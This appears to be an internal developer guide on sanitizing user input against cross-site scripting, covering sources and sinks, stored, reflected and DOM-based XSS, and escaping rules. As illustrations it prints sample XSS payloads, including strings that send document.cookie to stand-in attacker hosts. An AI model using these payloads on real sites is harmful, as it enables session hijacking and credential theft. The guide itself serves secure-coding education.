# Sanitizing user input

## Aside: sanitizing user input when using a framework

React automatically escapes any values embedded in JSX before rendering them. This helps prevent XSS (cross-site-scripting) attacks.
In fact when you do want to embed html tags inside a React component, you need to use a function aptly called [dangerouslySetInnerHTML](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)

When not using a framework, it's something we need to take care of ourselves.

## What is XSS

A cross-site-scripting attack happens when an attacker succeeds in injecting client-side scripts into a webpage viewed by other users.

## Sources and sinks

Source = a part of our code where data enters that can be influenced by a user
Sink = a context where untrusted input could be executed

Problems arise when data can flow uninhibited from source to sink.

## Examples of a sink

```javascript
createNavigationItem(navigationData) {
  const {url, text} = navigationData;
    const navigationItem = elementFromString(`
      <li>
        <porphyrio-text-link url="${url}">${text}</porphyrio-text-link>
      </li>
    `);

    return navigationItem;
}
```

or

```javascript
  render() {
    this.shadow.innerHTML = `
      <a href="${this.url}"><slot></slot></a>
    `;
  }
```

Not a problem per se. But problems arise if a user can cause `url` being set to something like the following strings:

```javascript
"><img src="" onerror="alert(1)" />

javascript:alert(1);

" onmouseover="location.href='http://attackerwebsite.ru?'+document.cookie

```

Using DOMParser or setting innerHTML may cause these kinds of string to end up in the wrong context: adding new parts to an url, adding new statements to a piece of code, adding new elements to a piece of HTML.

## Example of a source

In our benchmark app users can pick a title for a filter. Sketchy input is not properly sanitized. This can pose a problem if this user input ends up unsanitized in a sink.

## There are three forms of XSS.

### Stored XSS

User input (eg a comment) that contains a script is not properly sanitized and stored in a database (or log) that is viewed at a later time by another user.

### Reflected XSS

A user is tricked into following a malicious link or submitting a form. The webserver _reflects_ the input it received back to the user's browser.

Example
Website has a linkable search results page. https://website.be/pages?search=abc Results are properly sanitized and sent to the server. Server replies with the search results but also embeds what the user searched for inside the page. Attacker can craft a link with an injected script and send it to a victim.
Replace for instance the `abc` with properly encoded <img src="badwebsite.com?victim="+document.cookie />

### DOM-based XSS

An attacker modifies the DOM “environment” in the victim’s browser used by a javascript framework or client side script, so that the client side code runs in an “unexpected” manner. Attacker could do this by tricking user into following a malicious link or submitting a form.
DOM-based XSS attack is client-side. The malicious payload is never sent to the server. It will not show up when analyzing server logs.

Example
`document.location.search` is part of the environment that can be changed by a user.
The `getQuery` method inside `phy-router/utils/SearchParams/SearchParams` returns a string that has not been escaped (yet). So as a developer we need to remember that it's not safe to immediately use it with `innerHTML` or `utils/elementFromString`.

### Aside: role of frameworks

The problem is aggravated when client side code uses a template system to embed text in webpages. Modern browsers have filters that detect XSS attempts but they don't check template expressions that may also execute injected scripts. See for example the [vulnerability that was discovered inside Vue's template syntax](https://github.com/dotboris/vuejs-serverside-template-xss) when used in a server side rendered app.

## Possible consequences:

- Impersonate or masquerade as the victim user.
- Carry out any action that the user is able to perform. (A CSRF attack)
- Read any data that the user is able to access.
- Capture the user's login credentials.
- Perform virtual defacement of the web site.
- Inject trojan functionality into the web site.

## How to prevent?

- when reviewing code, search for all places where input from a user could possibly make its way into the HTML output (from source to sink)
- use automated tools for checking
- use <abbr title="Content Security Policy">CSP</abbr>: a browser security mechanism that restricts the resources a page can load.

### Which characters need to be escaped?

This depends on the context where unescaped values could end up
Taking the contexts most important for us:

Inside of an element:

    & becomes &amp;
    < becomes &lt;
    > becomes &gt;

Inside of attribute values:

    " becomes &quot;
    ' becomes &#39;

When constructing an url:

Except for alphanumeric characters, encode all characters with ASCII values less than 256 with the %HH encoding format.

Extra precautions are needed when user input can end up in other contexts. See [OWASP XSS Prevention Rules](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#XSS_Prevention_Rules)

## Links

[OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/)

Specific information on XSS: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)
Look at the testing guides for the 3 different forms of XSS and cheat sheets with prevention tips.

[Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

[DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
